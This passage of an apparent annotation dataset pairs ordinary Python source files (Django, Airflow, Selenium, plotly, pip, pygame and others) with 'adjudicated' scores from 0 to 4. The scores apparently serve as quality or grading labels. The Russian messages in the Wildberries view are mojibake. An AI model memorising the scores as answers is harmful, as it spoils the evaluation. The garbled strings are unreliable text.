    SIGN_UP_BUTTON = (By.CSS_SELECTOR, ""[name='registration_submit']"")


class ProductPageLocators():
    PRODUCT_NAME = (By.CSS_SELECTOR, "".product_main > h1"")
    ADD_TO_BASKET_BUTTON = (By. CSS_SELECTOR, "".btn-add-to-basket"")
    ADD_TO_WISHLIST_BUTTON = (By.CSS_SELECTOR, "".btn-wishlist"")
    PRODUCT_GALLERY = (By.CSS_SELECTOR, ""#product_gallery"")
    PRODUCT_DESCRIPTION = (By.CSS_SELECTOR, ""#product_description"")
    PRICE = (By.CSS_SELECTOR, "".product_main > .price_color"")
    AVAILABILITY = (By.CSS_SELECTOR, "".product_main > .availability"")
    WRITE_REVIEW = (By.CSS_SELECTOR, ""#write_review"")
    PRODUCT_INFO_TABLE = (By.CSS_SELECTOR, "".table-striped"")
    SUCCESS_MESSAGE = (By.CSS_SELECTOR, ""#messages > .alert-success:nth-child(1)"")
    NAME_OF_ADDED_PRODUCT = (By.CSS_SELECTOR, ""div.alert:nth-child(1) strong"")
    TOTAL_PRICE = (By.CSS_SELECTOR, "".alertinner p strong"")


class BasketPageLocators():
    VIEW_BASKET = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")
    VIEW_BASKET_INVALID = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")  # for checking the correct error message
    EMPTY_BASKET_MESSAGE = (By.CSS_SELECTOR, ""#content_inner > p"")
    FILLED_BASKET = (By.CSS_SELECTOR, "".basket-items"")"
421	adjudicated	0	"import asyncio
import json

from openpyxl import load_workbook
from rest_framework.response import Response
from rest_framework.views import APIView

from wildberries.models import Product
from wildberries.pydantic import CardPydantic
from wildberries.utils import make_request


class CardView(APIView):
    @staticmethod
    def get_card_info(value):
        page = asyncio.run(make_request(value))
        return CardView.get_objects(page, value)

    @staticmethod
    def get_cards_info(file):
        values = []
        wb = load_workbook(file)
        for sheet in wb.sheetnames:
            for row in wb[sheet].iter_rows(values_only=True):
                values.append(row[0])
        cards_info = [CardView.get_card_info(i) for i in values]
        return cards_info

    @staticmethod
    def get_objects(page, value):
        card = None
        try:
            products = json.dumps(page['data']['products'][0])
            card = CardPydantic.parse_raw(products)
            Product.objects.create(**card.dict())
        except IndexError:
            print(f'id {value} Ð¾ÑÑÑÑÑÑÐ²ÑÐµÑ Ð½Ð° ÑÐ°Ð¹ÑÐµ wildberries.ru')
        if card:
            return card.dict()
        else:
            return {'error': f'id {value} Ð¾ÑÑÑÑÑÑÐ²ÑÐµÑ Ð½Ð° ÑÐ°Ð¹ÑÐµ wildberries.ru'}

    def post(self, request, *args, **kwargs):
        data = None
        if 'file' in request.data and 'value' in request.data:
            return Response({'error': 'ÐÐ´Ð½Ð¾Ð²ÑÐµÐ¼ÐµÐ½Ð½Ð¾ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÑÑÑ Ð¿Ð¾Ð»Ñ '
                                      'file Ð¸ value Ð·Ð°Ð¿ÑÐµÑÐµÐ½Ð¾!'})
        elif 'file' in request.data:
            file = request.data['file']
            data = CardView.get_cards_info(file)
        elif 'value' in request.data:
            value = request.data['value']
            data = CardView.get_card_info(value)
        return Response(data)"
483	adjudicated	4	"from . import base
from . import fields
from . import mixins
from .mask_position import MaskPosition
from .photo_size import PhotoSize
from .file import File


class Sticker(base.TelegramObject, mixins.Downloadable):
    """"""
    This object represents a sticker.

    https://core.telegram.org/bots/api#sticker
    """"""
    file_id: base.String = fields.Field()
    file_unique_id: base.String = fields.Field()
    type: base.String = fields.Field()
    width: base.Integer = fields.Field()
    height: base.Integer = fields.Field()
    is_animated: base.Boolean = fields.Field()
    is_video: base.Boolean = fields.Field()
    thumb: PhotoSize = fields.Field(base=PhotoSize)
    emoji: base.String = fields.Field()
    set_name: base.String = fields.Field()
    premium_animation: File = fields.Field(base=File)
    mask_position: MaskPosition = fields.Field(base=MaskPosition)
    custom_emoji_id: base.String = fields.Field()
    file_size: base.Integer = fields.Field()

    async def set_position_in_set(self, position: base.Integer) -> base.Boolean:
        """"""
        Use this method to move a sticker in a set created by the bot to a specific position.

        Source: https://core.telegram.org/bots/api#setstickerpositioninset

        :param position: New sticker position in the set, zero-based
        :type position: :obj:`base.Integer`
        :return: Returns True on success
        :rtype: :obj:`base.Boolean`
        """"""
        return await self.bot.set_sticker_position_in_set(self.file_id, position=position)

    async def delete_from_set(self) -> base.Boolean:
        """"""
        Use this method to delete a sticker from a set created by the bot.

        Source: https://core.telegram.org/bots/api#deletestickerfromset

        :return: Returns True on success
        :rtype: :obj:`base.Boolean`
        """"""
        return await self.bot.delete_sticker_from_set(self.file_id)"
415	adjudicated	0	"import pandas as pd
import numpy as np
import random

import matplotlib.pyplot as plt
import seaborn as sns

from plotly import graph_objs as go
from plotly import express as px
from plotly.subplots import make_subplots

import pickle
import lightgbm as lgb



colorarr = ['#0592D0','#Cd7f32', '#E97451', '#Bdb76b', '#954535', '#C2b280', '#808000','#C2b280', '#E4d008', '#9acd32', '#Eedc82', '#E4d96f',
           '#32cd32','#39ff14','#00ff7f', '#008080', '#36454f', '#F88379', '#Ff4500', '#Ffb347', '#A94064', '#E75480', '#Ffb6c1', '#E5e4e2',
           '#Faf0e6', '#8c92ac', '#Dbd7d2','#A7a6ba', '#B38b6d']


cropdf = pd.read_csv(""D:/Suyash College Files/Semester 6/22060 - Capstone Project Execution and Report Writing/Datasets/Crop_recommendation.csv"")

X = cropdf.drop('label', axis=1)
y = cropdf['label']

from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.3,
                                                    shuffle = True, random_state = 0)

model = lgb.LGBMClassifier()
model.fit(X_train, y_train)

y_pred=model.predict(X_test)


from sklearn.metrics import accuracy_score

accuracy=accuracy_score(y_pred, y_test)
print('LightGBM Model accuracy score: {0:0.4f}'.format(accuracy_score(y_test, y_pred)))


y_pred_train = model.predict(X_train)
print('Training-set accuracy score: {0:0.4f}'. format(accuracy_score(y_train, y_pred_train)))

print('Training set score: {:.4f}'.format(model.score(X_train, y_train)))
print('Test set score: {:.4f}'.format(model.score(X_test, y_test)))


model.booster_.save_model('crop_predict1.h5')

        #        my_model.booster_.save_model('mode.txt')
        #        #load from model:
        #        #bst = lgb.Booster(model_file='mode.txt')



filename = ""trained_model.pkl""
pickle.dump(model,open(filename,'wb'))

print(""done with all"")

"
504	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""choropleth"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
444	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from __future__ import absolute_import

import cffi

c_source = """"""
    struct ArrowSchema {
      // Array type description
      const char* format;
      const char* name;
      const char* metadata;
      int64_t flags;
      int64_t n_children;
      struct ArrowSchema** children;
      struct ArrowSchema* dictionary;

      // Release callback
      void (*release)(struct ArrowSchema*);
      // Opaque producer-specific data
      void* private_data;
    };

    struct ArrowArray {
      // Array data description
      int64_t length;
      int64_t null_count;
      int64_t offset;
      int64_t n_buffers;
      int64_t n_children;
      const void** buffers;
      struct ArrowArray** children;
      struct ArrowArray* dictionary;

      // Release callback
      void (*release)(struct ArrowArray*);
      // Opaque producer-specific data
      void* private_data;
    };

    struct ArrowArrayStream {
      int (*get_schema)(struct ArrowArrayStream*, struct ArrowSchema* out);
      int (*get_next)(struct ArrowArrayStream*, struct ArrowArray* out);

      const char* (*get_last_error)(struct ArrowArrayStream*);

      // Release callback
      void (*release)(struct ArrowArrayStream*);
      // Opaque producer-specific data
      void* private_data;
    };
    """"""

# TODO use out-of-line mode for faster import and avoid C parsing
ffi = cffi.FFI()
ffi.cdef(c_source)"
179	adjudicated	4	"""""""core URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/3.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""
from django.conf import settings
from django.contrib import admin
from django.urls import include, path

from . import views

# from django.views import debug


# Admin site Branding
admin.site.site_header = ""CoreProject administration""
admin.site.site_title = ""CoreProject site admin""

# Error handlers
handler400 = views.four_zero_zero_view
handler403 = views.four_zero_three_view
handler404 = views.four_zero_four_view
handler500 = views.five_zero_zero_view

# Write your urls here

urlpatterns = [
    # Default django welcome page
    # path("""", debug.default_urlconf),
    path("""", views.home_view, name=""home_view""),
    #   Admin Site
    # ================
    path(""admin/"", admin.site.urls),
    #   HTTP
    # =========
    path(""user/"", include(""apps.user.urls"")),
    #   OpenGraph
    # =============
    path(""opengraph/"", include(""apps.opengraph.urls"")),
    #   Api
    # ========
    path(""api/"", include(""apps.api.urls"")),
]

if settings.DEBUG:
    urlpatterns += [
        path(""__debug__/"", include(""debug_toolbar.urls"")),
        path(""__reload__/"", include(""django_browser_reload.urls"")),
        #   Errors
        # ===========
        path(""400/"", handler400),
        path(""403/"", handler403),
        path(""404/"", handler404),
        path(""500/"", handler500),
    ]"
39	adjudicated	3	"# Licensed to the Software Freedom Conservancy (SFC) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The SFC licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from selenium.webdriver.common import service


class Service(service.Service):

    def __init__(self, executable_path, port=0, verbose=False, log_path=None):
        """"""
        Creates a new instance of the EdgeDriver service.

        EdgeDriver provides an interface for Microsoft WebDriver to use
        with Microsoft Edge.

        :param executable_path: Path to the Microsoft WebDriver binary.
        :param port: Run the remote service on a specified port.
            Defaults to 0, which binds to a random open port of the
            system's choosing.
        :verbose: Whether to make the webdriver more verbose (passes the
            --verbose option to the binary). Defaults to False.
        :param log_path: Optional path for the webdriver binary to log to.
            Defaults to None which disables logging.

        """"""

        self.service_args = []
        if verbose:
            self.service_args.append(""--verbose"")

        params = {
            ""executable"": executable_path,
            ""port"": port,
            ""start_error_message"": ""Please download from http://go.microsoft.com/fwlink/?LinkId=619687""
        }

        if log_path:
            params[""log_file""] = open(log_path, ""a+"")

        service.Service.__init__(self, **params)

    def command_line_args(self):
        return [""--port=%d"" % self.port] + self.service_args"
128	adjudicated	4	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""""" Sample command-line program to list Cloud Dataproc clusters in a region.

Example usage:
python list_clusters.py --project_id=my-project-id --region=global

""""""
import argparse

from google.cloud import dataproc_v1


# [START dataproc_list_clusters]
def list_clusters(dataproc, project, region):
    """"""List the details of clusters in the region.""""""
    for cluster in dataproc.list_clusters(
        request={""project_id"": project, ""region"": region}
    ):
        print((""{} - {}"".format(cluster.cluster_name, cluster.status.state.name)))


# [END dataproc_list_clusters]


def main(project_id, region):

    if region == ""global"":
        # Use the default gRPC global endpoints.
        dataproc_cluster_client = dataproc_v1.ClusterControllerClient()
    else:
        # Use a regional gRPC endpoint. See:
        # https://cloud.google.com/dataproc/docs/concepts/regional-endpoints
        dataproc_cluster_client = dataproc_v1.ClusterControllerClient(
            client_options={""api_endpoint"": f""{region}-dataproc.googleapis.com:443""}
        )

    list_clusters(dataproc_cluster_client, project_id, region)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=(argparse.RawDescriptionHelpFormatter)
    )
    parser.add_argument(""--project_id"", help=""Project ID to access."", required=True)
    parser.add_argument(""--region"", help=""Region of clusters to list."", required=True)

    args = parser.parse_args()
    main(args.project_id, args.region)"
68	adjudicated	2	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        (""match="", ""m"", ""patterns to match (required)""),
        (""dist-dir="", ""d"", ""directory where the distributions are""),
        (""keep="", ""k"", ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError as e:
            raise DistutilsOptionError(""--keep must be an integer"") from e
        if isinstance(self.match, str):
            self.match = [convert_path(p.strip()) for p in self.match.split("","")]
        self.set_undefined_options(""bdist"", (""dist_dir"", ""dist_dir""))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + ""*"" + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep :]
            for t, f in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
78	adjudicated	2	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from typing import NamedTuple

from marshmallow import Schema, fields
from marshmallow_sqlalchemy import SQLAlchemySchema, auto_field

from airflow.models.log import Log


class EventLogSchema(SQLAlchemySchema):
    """"""Event log schema.""""""

    class Meta:
        """"""Meta.""""""

        model = Log

    id = auto_field(data_key=""event_log_id"", dump_only=True)
    dttm = auto_field(data_key=""when"", dump_only=True)
    dag_id = auto_field(dump_only=True)
    task_id = auto_field(dump_only=True)
    event = auto_field(dump_only=True)
    execution_date = auto_field(dump_only=True)
    owner = auto_field(dump_only=True)
    extra = auto_field(dump_only=True)


class EventLogCollection(NamedTuple):
    """"""List of import errors with metadata.""""""

    event_logs: list[Log]
    total_entries: int


class EventLogCollectionSchema(Schema):
    """"""EventLog Collection Schema.""""""

    event_logs = fields.List(fields.Nested(EventLogSchema))
    total_entries = fields.Int()


event_log_schema = EventLogSchema()
event_log_collection_schema = EventLogCollectionSchema()"
138	adjudicated	2	"import functools
from pathlib import Path

from django.conf import settings
from django.template.backends.django import DjangoTemplates
from django.template.loader import get_template
from django.utils.functional import cached_property
from django.utils.module_loading import import_string

try:
    from django.template.backends.jinja2 import Jinja2
except ImportError:
    def Jinja2(params):
        raise ImportError(""jinja2 isn't installed"")

ROOT = Path(__file__).parent


@functools.lru_cache()
def get_default_renderer():
    renderer_class = import_string(settings.FORM_RENDERER)
    return renderer_class()


class BaseRenderer:
    def get_template(self, template_name):
        raise NotImplementedError('subclasses must implement get_template()')

    def render(self, template_name, context, request=None):
        template = self.get_template(template_name)
        return template.render(context, request=request).strip()


class EngineMixin:
    def get_template(self, template_name):
        return self.engine.get_template(template_name)

    @cached_property
    def engine(self):
        return self.backend({
            'APP_DIRS': True,
            'DIRS': [ROOT / self.backend.app_dirname],
            'NAME': 'djangoforms',
            'OPTIONS': {},
        })


class DjangoTemplates(EngineMixin, BaseRenderer):
    """"""
    Load Django templates from the built-in widget templates in
    django/forms/templates and from apps' 'templates' directory.
    """"""
    backend = DjangoTemplates


class Jinja2(EngineMixin, BaseRenderer):
    """"""
    Load Jinja2 templates from the built-in widget templates in
    django/forms/jinja2 and from apps' 'jinja2' directory.
    """"""
    backend = Jinja2


class TemplatesSetting(BaseRenderer):
    """"""
    Load templates using template.loader.get_template() which is configured
    based on settings.TEMPLATES.
    """"""
    def get_template(self, template_name):
        return get_template(template_name)"
29	adjudicated	1	"import socket
import typing

from tornado.http1connection import HTTP1Connection
from tornado.httputil import HTTPMessageDelegate
from tornado.iostream import IOStream
from tornado.locks import Event
from tornado.netutil import add_accept_handler
from tornado.testing import AsyncTestCase, bind_unused_port, gen_test


class HTTP1ConnectionTest(AsyncTestCase):
    code = None  # type: typing.Optional[int]

    def setUp(self):
        super().setUp()
        self.asyncSetUp()

    @gen_test
    def asyncSetUp(self):
        listener, port = bind_unused_port()
        event = Event()

        def accept_callback(conn, addr):
            self.server_stream = IOStream(conn)
            self.addCleanup(self.server_stream.close)
            event.set()

        add_accept_handler(listener, accept_callback)
        self.client_stream = IOStream(socket.socket())
        self.addCleanup(self.client_stream.close)
        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]
        self.io_loop.remove_handler(listener)
        listener.close()

    @gen_test
    def test_http10_no_content_length(self):
        # Regression test for a bug in which can_keep_alive would crash
        # for an HTTP/1.0 (not 1.1) response with no content-length.
        conn = HTTP1Connection(self.client_stream, True)
        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")
        self.server_stream.close()

        event = Event()
        test = self
        body = []

        class Delegate(HTTPMessageDelegate):
            def headers_received(self, start_line, headers):
                test.code = start_line.code

            def data_received(self, data):
                body.append(data)

            def finish(self):
                event.set()

        yield conn.read_response(Delegate())
        yield event.wait()
        self.assertEqual(self.code, 200)
        self.assertEqual(b"""".join(body), b""hello"")"
169	adjudicated	3	"#
# The Python Imaging Library.
# $Id$
#
# Binary input/output support routines.
#
# Copyright (c) 1997-2003 by Secret Labs AB
# Copyright (c) 1995-2003 by Fredrik Lundh
# Copyright (c) 2012 by Brian Crowell
#
# See the README file for information on usage and redistribution.
#


""""""Binary input/output support routines.""""""


from struct import pack, unpack_from


def i8(c):
    return c if c.__class__ is int else c[0]


def o8(i):
    return bytes((i & 255,))


# Input, le = little endian, be = big endian
def i16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<H"", c, o)[0]


def si16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<h"", c, o)[0]


def si16be(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer, big endian.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from("">h"", c, o)[0]


def i32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<I"", c, o)[0]


def si32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<i"", c, o)[0]


def i16be(c, o=0):
    return unpack_from("">H"", c, o)[0]


def i32be(c, o=0):
    return unpack_from("">I"", c, o)[0]


# Output, le = little endian, be = big endian
def o16le(i):
    return pack(""<H"", i)


def o32le(i):
    return pack(""<I"", i)


def o16be(i):
    return pack("">H"", i)


def o32be(i):
    return pack("">I"", i)"
454	adjudicated	1	"""""""
views.py        # Houses `SchemaView`, `APIView` subclass.

See schemas.__init__.py for package overview.
""""""
from rest_framework import exceptions, renderers
from rest_framework.response import Response
from rest_framework.schemas import coreapi
from rest_framework.settings import api_settings
from rest_framework.views import APIView


class SchemaView(APIView):
    _ignore_model_permissions = True
    schema = None  # exclude from schema
    renderer_classes = None
    schema_generator = None
    public = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if self.renderer_classes is None:
            if coreapi.is_enabled():
                self.renderer_classes = [
                    renderers.CoreAPIOpenAPIRenderer,
                    renderers.CoreJSONRenderer
                ]
            else:
                self.renderer_classes = [
                    renderers.OpenAPIRenderer,
                    renderers.JSONOpenAPIRenderer,
                ]
            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:
                self.renderer_classes += [renderers.BrowsableAPIRenderer]

    def get(self, request, *args, **kwargs):
        schema = self.schema_generator.get_schema(request, self.public)
        if schema is None:
            raise exceptions.PermissionDenied()
        return Response(schema)

    def handle_exception(self, exc):
        # Schema renderers do not render exceptions, so re-perform content
        # negotiation with default renderers.
        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES
        neg = self.perform_content_negotiation(self.request, force=True)
        self.request.accepted_renderer, self.request.accepted_media_type = neg
        return super().handle_exception(exc)"
514	adjudicated	3	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column='geometry_type')

    class Meta:
        app_label = 'gis'
        db_table = 'geometry_columns'
        managed = False

    def __str__(self):
        return '%s.%s - %dD %s field (SRID: %d)' % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'f_table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'f_geometry_column'


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""
    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = 'gis'
        db_table = 'spatial_ref_sys'
        managed = False

    @property
    def wkt(self):
        return self.srtext"
405	adjudicated	4	"from itertools import filterfalse


def unique_everseen(iterable, key=None):
    ""List unique elements, preserving order. Remember all elements ever seen.""
    # unique_everseen('AAAABBBCCDAABBB') --> A B C D
    # unique_everseen('ABBCcAD', str.lower) --> A B C D
    seen = set()
    seen_add = seen.add
    if key is None:
        for element in filterfalse(seen.__contains__, iterable):
            seen_add(element)
            yield element
    else:
        for element in iterable:
            k = key(element)
            if k not in seen:
                seen_add(k)
                yield element


# copied from more_itertools 8.8
def always_iterable(obj, base_type=(str, bytes)):
    """"""If *obj* is iterable, return an iterator over its items::

        >>> obj = (1, 2, 3)
        >>> list(always_iterable(obj))
        [1, 2, 3]

    If *obj* is not iterable, return a one-item iterable containing *obj*::

        >>> obj = 1
        >>> list(always_iterable(obj))
        [1]

    If *obj* is ``None``, return an empty iterable:

        >>> obj = None
        >>> list(always_iterable(None))
        []

    By default, binary and text strings are not considered iterable::

        >>> obj = 'foo'
        >>> list(always_iterable(obj))
        ['foo']

    If *base_type* is set, objects for which ``isinstance(obj, base_type)``
    returns ``True`` won't be considered iterable.

        >>> obj = {'a': 1}
        >>> list(always_iterable(obj))  # Iterate over the dict's keys
        ['a']
        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit
        [{'a': 1}]

    Set *base_type* to ``None`` to avoid any special handling and treat objects
    Python considers iterable as iterable:

        >>> obj = 'foo'
        >>> list(always_iterable(obj, base_type=None))
        ['f', 'o', 'o']
    """"""
    if obj is None:
        return iter(())

    if (base_type is not None) and isinstance(obj, base_type):
        return iter((obj,))

    try:
        return iter(obj)
    except TypeError:
        return iter((obj,))"
493	adjudicated	2	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest import mock

import pytest

from airflow.cli import cli_parser
from airflow.cli.commands import dag_processor_command
from airflow.configuration import conf
from tests.test_utils.config import conf_vars


class TestDagProcessorCommand:
    """"""
    Tests the CLI interface and that it correctly calls the DagProcessor
    """"""

    @classmethod
    def setup_class(cls):
        cls.parser = cli_parser.get_parser()

    @conf_vars(
        {
            (""scheduler"", ""standalone_dag_processor""): ""True"",
            (""core"", ""load_examples""): ""False"",
        }
    )
    @mock.patch(""airflow.cli.commands.dag_processor_command.DagProcessorJob"")
    @pytest.mark.skipif(
        conf.get_mandatory_value(""database"", ""sql_alchemy_conn"").lower().startswith(""sqlite""),
        reason=""Standalone Dag Processor doesn't support sqlite."",
    )
    def test_start_job(
        self,
        mock_dag_job,
    ):
        """"""Ensure that DagFileProcessorManager is started""""""
        with conf_vars({(""scheduler"", ""standalone_dag_processor""): ""True""}):
            args = self.parser.parse_args([""dag-processor""])
            dag_processor_command.dag_processor(args)
            mock_dag_job.return_value.run.assert_called()"
431	adjudicated	3	"import os
import string
import urllib.parse
import urllib.request
from typing import Optional

from .compat import WINDOWS


def get_url_scheme(url: str) -> Optional[str]:
    if "":"" not in url:
        return None
    return url.split("":"", 1)[0].lower()


def path_to_url(path: str) -> str:
    """"""
    Convert a path to a file: URL.  The path will be made absolute and have
    quoted path parts.
    """"""
    path = os.path.normpath(os.path.abspath(path))
    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))
    return url


def url_to_path(url: str) -> str:
    """"""
    Convert a file: URL to a path.
    """"""
    assert url.startswith(
        ""file:""
    ), f""You can only turn file: urls into filenames (not {url!r})""

    _, netloc, path, _, _ = urllib.parse.urlsplit(url)

    if not netloc or netloc == ""localhost"":
        # According to RFC 8089, same as empty authority.
        netloc = """"
    elif WINDOWS:
        # If we have a UNC path, prepend UNC share notation.
        netloc = ""\\\\"" + netloc
    else:
        raise ValueError(
            f""non-local file URIs are not supported on this platform: {url!r}""
        )

    path = urllib.request.url2pathname(netloc + path)

    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".
    # This creates issues for path-related functions like io.open(), so we try
    # to detect and strip the leading slash.
    if (
        WINDOWS
        and not netloc  # Not UNC.
        and len(path) >= 3
        and path[0] == ""/""  # Leading slash to strip.
        and path[1] in string.ascii_letters  # Drive letter.
        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.
    ):
        path = path[1:]

    return path"
460	adjudicated	1	"#!/usr/bin/env python
"""""" pygame.examples.setmodescale

On high resolution displays(4k, 1080p) and tiny graphics games (640x480)
show up very small so that they are unplayable. SCALED scales up the window
for you. The game thinks it's a 640x480 window, but really it can be bigger.
Mouse events are scaled for you, so your game doesn't need to do it.

Passing SCALED to pygame.display.set_mode means the resolution depends
on desktop size and the graphics are scaled.
""""""

import pygame as pg

pg.init()

RES = (160, 120)
FPS = 30
clock = pg.time.Clock()

print(""desktops"", pg.display.get_desktop_sizes())
screen = pg.display.set_mode(RES, pg.SCALED | pg.RESIZABLE)

